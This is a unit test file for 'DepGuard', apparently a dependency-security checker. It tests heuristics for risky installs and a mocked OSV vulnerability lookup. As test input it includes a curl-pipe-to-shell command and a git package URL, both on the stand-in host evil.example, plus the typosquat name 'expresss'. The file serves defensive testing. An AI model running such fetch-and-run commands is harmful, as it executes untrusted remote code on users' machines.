/**
 * Phase 10 — Dependency Guard behavioral unit tests.
 * Pure heuristics + mocked OSV (no live network, no VS Code host).
 */
import { describe, it } from "node:test";
import assert from "node:assert/strict";
import {
    analyzeInstallCommand,
    analyzePackage,
    queryOsv,
    queryOsvBatch,
} from "../dep-guard/DepGuardCore";

describe("DepGuard heuristics", () => {
    it("flags curl|sh install as critical", () => {
        const findings = analyzeInstallCommand("curl https://evil.example/install.sh | sh");
        assert.ok(findings.some((f) => f.risk === "critical"));
        assert.ok(findings.some((f) => /curl pipe/i.test(f.reasons.join(" "))));
    });

    it("flags typosquat-like package names", () => {
        const r = analyzePackage("expresss", "1.0.0");
        assert.equal(r.risk, "high");
        assert.ok(r.reasons.some((x) => /typosquat/i.test(x)));
    });

    it("flags unpinned and remote URL installs", () => {
        assert.equal(analyzePackage("left-pad", "latest").risk, "medium");
        const remote = analyzePackage("evil", "git+https://evil.example/pkg.git");
        assert.equal(remote.risk, "high");
        assert.ok(remote.reasons.some((x) => /Remote URL|git/i.test(x)));
    });

    it("parses npm install package@version", () => {
        const findings = analyzeInstallCommand("npm install expresss@1.2.3");
        assert.ok(findings.some((f) => f.name === "expresss"));
    });
});

describe("DepGuard OSV client (mocked)", () => {
    it("skips unpinned versions without inventing CVEs", async () => {
        let calls = 0;
        const fetchImpl = (async () => {
            calls++;
            return new Response("{}", { status: 200 });
        }) as typeof fetch;
        const r = await queryOsv("lodash", "latest", "npm", fetchImpl);
        assert.equal(calls, 0);
        assert.equal(r.vulns.length, 0);
        assert.ok(r.error);
    });

    it("maps OSV vulns from a successful query", async () => {
        const fetchImpl = (async () =>
            new Response(
                JSON.stringify({
                    vulns: [
                        { id: "GHSA-xxxx-yyyy-zzzz", summary: "test advisory" },
                        { id: "CVE-2020-0001", summary: "another" },
                    ],
                }),
                { status: 200, headers: { "content-type": "application/json" } },
            )) as typeof fetch;
        const r = await queryOsv("lodash", "4.17.20", "npm", fetchImpl);
        assert.equal(r.vulns.length, 2);
        assert.equal(r.vulns[0].id, "GHSA-xxxx-yyyy-zzzz");
        assert.equal(r.error, undefined);
        assert.ok(r.fetchedAt);
    });

    it("returns error metadata on HTTP failure without throwing", async () => {
        const fetchImpl = (async () => new Response("nope", { status: 503 })) as typeof fetch;
        const r = await queryOsv("lodash", "4.17.20", "npm", fetchImpl);
        assert.equal(r.vulns.length, 0);
        assert.match(r.error ?? "", /OSV HTTP 503/);
    });

    it("batch query maps results by index", async () => {
        const fetchImpl = (async (_url: any, init?: any) => {
            const body = JSON.parse(String(init?.body ?? "{}"));
            assert.ok(Array.isArray(body.queries));
            return new Response(
                JSON.stringify({
                    results: [
                        { vulns: [{ id: "GHSA-aaaa" }] },
                        { vulns: [] },
                    ],
                }),
                { status: 200 },
            );
        }) as typeof fetch;
        const results = await queryOsvBatch(
            [
                { name: "a", version: "1.0.0" },
                { name: "b", version: "2.0.0" },
            ],
            fetchImpl,
        );
        assert.equal(results.length, 2);
        assert.equal(results[0].vulns[0]?.id, "GHSA-aaaa");
        assert.equal(results[1].vulns.length, 0);
    });
});
